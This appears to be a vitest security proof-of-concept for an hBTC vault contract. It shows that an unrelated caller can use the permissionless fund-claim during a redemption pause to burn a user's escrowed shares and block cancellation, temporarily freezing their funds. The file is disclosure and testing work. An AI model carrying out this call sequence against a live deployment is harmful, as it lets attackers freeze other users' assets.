// SPDX-License-Identifier: BUSL-1.1
// Security PoC: permissionless fund-claim can convert a cancellable standard
// claim into an uncancellable funded claim while redeem-enabled=false.

import { beforeEach, describe, expect, it } from 'vitest';
import {
  vault,
  state,
  hbtcToken,
  deployer,
  user1,
  user2,
  ONE_BTC,
  ERR,
  txOk,
  txErr,
  rov,
  initProtocol,
  mineBlocks,
} from '../../helpers/setup.js';

function advancePastStandardCooldown() {
  // Same helper size used by the upstream vault tests; comfortably exceeds 3 days.
  mineBlocks(500);
}

function armMatureStandardClaim() {
  const deposit = txOk(vault.deposit(ONE_BTC, null), user1);
  expect(deposit.value).toBe(ONE_BTC);

  const request = txOk(vault.requestRedeem(ONE_BTC, false), user1);
  expect(request.value).toBe(1n);

  expect(rov(hbtcToken.getBalance(user1)).value).toBe(0n);
  advancePastStandardCooldown();
}

beforeEach(() => {
  initProtocol();
});

describe('hBTC paused force-funding freeze', () => {
  it('CONTROL: a matured unfunded standard claim remains cancellable while redemptions are paused', () => {
    armMatureStandardClaim();

    // Emergency-style redemption pause. Other protocol/custody flags remain enabled.
    txOk(state.setRedeemEnabled(false), deployer);

    const paused = rov(state.getRedeemEnabled());
    expect(paused).toBe(false);

    // The pause by itself does not freeze this user's escrowed hBTC: cancel-redeem
    // intentionally has no redeem-enabled guard and returns the shares.
    const cancel = txOk(vault.cancelRedeem(1n), user1);
    expect(cancel.value).toBe(ONE_BTC);
    expect(rov(hbtcToken.getBalance(user1)).value).toBe(ONE_BTC);

    console.log('CONTROL_CANCEL_WHILE_PAUSED=SUCCESS');
    console.log('CONTROL_USER_HBTC_AFTER_CANCEL=' + rov(hbtcToken.getBalance(user1)).value.toString());
  });

  it('ATTACK: unrelated caller can fund during the pause and force the claim into an uncancellable/unredeemable state', () => {
    armMatureStandardClaim();

    txOk(state.setRedeemEnabled(false), deployer);
    expect(rov(state.getRedeemEnabled())).toBe(false);

    // user2 is an ordinary test user and is not assigned the MANAGER role by initProtocol.
    // fund-claim is intentionally permissionless after cooldown, and crucially does not
    // check redeem-enabled. Reserve transfer also checks transfer-enabled, not redeem-enabled.
    const funded = txOk(vault.fundClaim(1n), user2);
    expect(funded.value).toBe(ONE_BTC);

    // Funding burns the escrowed hBTC shares; the victim cannot cancel anymore.
    expect(rov(hbtcToken.getBalance(user1)).value).toBe(0n);
    const cancelAfterForcedFunding = txErr(vault.cancelRedeem(1n), user1);
    expect(cancelAfterForcedFunding.value).toBe(ERR.ALREADY_FUNDED);

    // And the actual asset payout is blocked by the redemption pause.
    const redeemWhilePaused = txErr(vault.redeem(1n), user1);
    expect(redeemWhilePaused.value).toBe(ERR.REDEEM_DISABLED);

    console.log('ATTACK_THIRD_PARTY_FUND_WHILE_PAUSED=SUCCESS');
    console.log('ATTACK_CANCEL_AFTER_FORCE_FUND_ERR=' + cancelAfterForcedFunding.value.toString());
    console.log('ATTACK_REDEEM_WHILE_PAUSED_ERR=' + redeemWhilePaused.value.toString());
    console.log('ATTACK_USER_HBTC_AFTER_FORCE_FUND=' + rov(hbtcToken.getBalance(user1)).value.toString());

    // Negative control: once governance re-enables redemption, the same funded claim can
    // finally pay out. This proves temporary (pause-duration) freezing rather than loss.
    txOk(state.setRedeemEnabled(true), deployer);
    const redeemed = txOk(vault.redeem(1n), user1);
    expect(redeemed.value).toBe(ONE_BTC);

    console.log('NEGATIVE_CONTROL_REDEEM_AFTER_UNPAUSE=SUCCESS');
    console.log('PASS PAUSED FORCE-FUNDING FREEZE: pause alone leaves an unfunded standard claim cancellable, but an unrelated non-manager can permissionlessly fund it during the pause, irreversibly removing cancellation while redeem remains disabled; funds become inaccessible until redemption is re-enabled.');
  });
});
